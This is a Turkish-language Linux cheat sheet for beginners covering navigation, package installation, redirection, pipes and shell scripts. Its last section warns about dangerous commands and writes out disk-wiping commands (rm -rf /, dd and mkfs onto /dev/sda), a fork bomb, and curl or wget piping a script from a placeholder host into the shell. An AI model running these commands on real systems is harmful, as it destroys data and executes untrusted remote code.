# Linux Hile Kağıdı

## Temel komutlar

> Çoğu basit komut Unix benzeri olduğu için MacOS'e benzemektedir.

```bash
cd ./klasor # Klasörün içine girer

cd ./project/src # project içindeki src klasörünün içine girer

rm -rf ./klasor # belirtilen klasörü içindekilerle beraber siler.
# -r => Recursive => iç içe
# -f => Force => Zorla yaptır

## Dosya ya da klasör ismi yazarken tab tuşu yardımıyla otomatik tamamlayabilirsiniz

touch file.txt # file.txt adında yeni bir dosya açar

rm file.txt # file.txt dosyasını siler

cat file.txt # file.txt dosyasının içeriğini terminale basar

nano file.txt # file.txt dosyasını text editör ile açar. Kaydetmek için CTRL+O ve ENTER yapılır. Daha fazla işlem CTRL tuşu ile ekranın aşağısında ^ karakterinden sonra başlayan harfe basarak yapılabilir

vim file.txt # file.txt dosyasını text editör ile açar. Daha fazla bilgi: vim.md

sudo komut # bir komutu yönetici olarak çalıştırmanıza olanak tanır. Yönetici parolası gerekir

```

## Uygulama kurma

- Eğer çalıştığınız Linux distrosu Debian, Ubuntu ya da benzeri bir işletim sistemi ise `apt` komutu kullanılır.

```bash
sudo apt-get update
#Sistemdeki paket reposu güncellenmeden uygulama kurulması sisteminizi bozabilir
sudo apt-get install fastfetch
fastfetch
```

- Eğer çalıştığınız Linux distrosu Red Hat, Fedora, Alma, ya da Rocky ise `dnf` komutu kullanılır.

```bash
sudo dnf install fastfetch
fastfetch
```

- Paket ismini bilmiyorsanız kullandığınız işletim sistemi ile beraber paket ismi aratılmalıdır. Ama bazen komutu yazıp enterlarsanız, ve komut bulunamadı hatasından sonra da bunu görüyorsanız, işletim sistemi muhtemelen buradan da kurmanıza izin verecektir

```
> nest
bash: nest: komut bulunamadı...
'nest' paketi 'nest' komutunu sağlaması için kurulsun mu? [N/y] #y basılıp kurulabilir
```

- Sistem deposundan olmayan bir paket dışarıdan repo eklenerek kurulabilir. bu durumda eklenen repo'dan emin olunmalıdır

## Konsol çıktısını dosyaya kaydetme (stdout)

Eğer komuttan çıkan stdout akışını dosyaya kaydetmek isterseniz, bunu ">" ile yapabilirsiniz

```
komut > cikti.txt
```

`cikti.txt`yi herhangi bir not defteri uygulamasıyla açarsanız, uygulama çıktısını görebilirsiniz.

Örnek:

```
mysqldump db_name > yedek.sql
```

Eğer `>` yerine `>>` kullanırsanız, bu dosyayı silyaz yapmak yerine sonuna ekler.

## Konsolda input verme (stdin)

Küçüktür işaretinin tersi ile (`<`) dosyalarınızı komuta okutabilirsiniz

```bash
cat < notlar.txt
```

burada `notlar.txt` dosyasını `cat` komutu vasıtasıyla ekrana okutacaktır. Başka bir örnek ise önceki örnekte yapılan mysql yedeğini yüklemektir

```
mysql --user=user_name -p"sizin parolanız" db_name < yedek.sql
```

## Komuttan komuta veri gönderme (Pipe)

Bir uygulamadan diğer uygulamaya veri göndermek için pipe (`|`) operatörü kullanabilirsiniz

```bash
cat dosya.txt | grep -e "Aranan metin"
```

Eğer stdin'den veri almayı desteklemiyorsa, komutun sonuna `-` eklenebilir. Örn: veritabanı çıktısını vimde düzenlemek için:

```bash
mysqldump database | vim -
```

## Bir script oluşturma

Dilediğiniz text editorü kullanarak dosyanızı oluşturabilir ve .sh uzantısıyla kaydedebilirsiniz

```bash
nano script.sh # Nano editör
vim script.sh # Vim editör
code script.sh # VS Code klasörü eğer $PATH değişkenine ekliyse
# vscode olarak çalıştırılabilir. Linux'ta path variable'ına otomatik olarak
# eklenir ancak macos'ta f1 > "Shell Command: Install 'code' command in PATH"
# seçeneğini çalıştırmalısınız
gedit script.sh # gnome masaüstü ortamında gedit ile açmak için
kwrite script.sh # kde plasma ortamında kwrte ile açmak için
```

Bu scriptin içerisine terminalde çalıştırabildiğiniz komutları sırasıyla yazıp kaydedebilirsiniz.

```bash
#script.sh

export IMAGE_NAME='hcangunduz/kompaney-api'
export IMAGE_TAG='latest'
docker build -t ${IMAGE_NAME}:${IMAGE_TAG} .
docker push ${IMAGE_NAME}:${IMAGE_TAG}
```

Kaydettikten sonra dosyayı çalıştırabilmek için ayrıca son bir şey kalıyor.

```bash
sudo chmod +xrw script.sh
```

Scripti çalıştırabilmek için terminalde bunu çalıştırabilirsiniz

```bash
./script.sh
```

> Parametreler, İf, for kondisyonları ile ilgili daha fazla detayı [bash-script-extra.md](bash-script-extra.md) ye göz atabilirsiniz.

## ‼️‼️‼️Tehlikeli komutlar

```bash
rm -rf /
# Kök pathini tamamen siler. Ancak bu işletim sisteminizin diskiyle sınırlı kalmayacaktır. Mountlanmış (taktığınız ve dosya yöneticinizde "bağla" seçeneğini tıklamış olduğunuz) ne kadar disk varsa onlarla vedalaşmanız gerekecek

command >/dev/sda
# bir komutun çıktısını diske yazar. Dolayısıyla diski siler. işletim sisteminizin çalıştığı disk de olabilir

dd if=/dev/random of=/dev/sda
## if ile belirtilen imajı diske imajlar. of= parametresindeki diskin imajlamak istediğiniz disk olduğundan EMİN OLUN

mkfs.ext3 /dev/sda
## Diski formatlar

wget http://unknown.com.tr/script.sh -O-|sh
curl -o- http://unknown.com.tr/script.sh |sh
curl -o- http://unknown.com.tr/script.sh |bash
curl -o- http://unknown.com.tr/script.sh |zsh vs vs
## Uzaktan script çalıştırır. Çalıştırmadan önce siteden emin olun

history | sh
# geçmişte çalıştırdığınız komutları tekrar çalıştırır. Muhtemelen ilk formattan itibaren...

:(){ :|:& };:
# kod fork bombası olarak bilinir. Kendini sistem donana kadar çalıştırır (forklar).

"/dev/null içerikli herhangi bir kod"
# /dev/null karadelik olarak bilinir. mv dosya /dev/null yaparak dosyalarınızı kaybedebilirsiniz ve ya sisteminizi bozabilirsiniz.

```
